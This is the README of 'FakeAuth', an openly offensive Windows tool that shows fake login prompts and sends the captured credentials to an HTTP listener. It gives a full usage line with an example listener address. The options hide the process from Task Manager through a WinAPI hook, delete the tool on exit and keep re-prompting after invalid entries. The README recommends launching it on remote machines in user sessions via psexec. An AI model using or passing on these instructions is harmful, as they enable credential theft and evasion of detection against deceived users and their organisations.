# FakeAuth

FakeAuth is a tool that prompts for user credentials and exfiltrates it with HTTP protocol.

Inspired by following projects
1) hlldz's PICKL3 [https://github.com/hlldz/pickl3](https://github.com/hlldz/pickl3)

Expect dirty code and some bugs ;)

## Installation

No special requirements


## Usage v1.01

```
Usage:   FakeAuth.exe <hide> <mode> <type> <count> <title> <message> <listener>
Example: FakeAuth.exe 1 1 1 10 window_title enter_creds 10.0.0.0:80\n
hide     (integer) -> Hide Process in Taskmgr by WinAPI-Hook (0,1 - requires FakeAuth.dll) 
mode     (integer) -> Self-Delete at process stop (0,1) - .dll only possible if taskmgr closed!
type     (integer) -> Prompt Style (1,2)
count    (long)    -> How many prompts after invalid Credentials (0,1,2,..,n 0=unlimited)
title    (string)  -> Prompt title (visible in type=1 only)
message  (string)  -> Window message
listener (string)  -> HTTP exfiltration listener (10.0.0.0:80), if not specified print stdout
```

Best way to use is to start on a remote machines in a user session. (psexec or other helpers)

## Contact

@atn1ght1 Twitter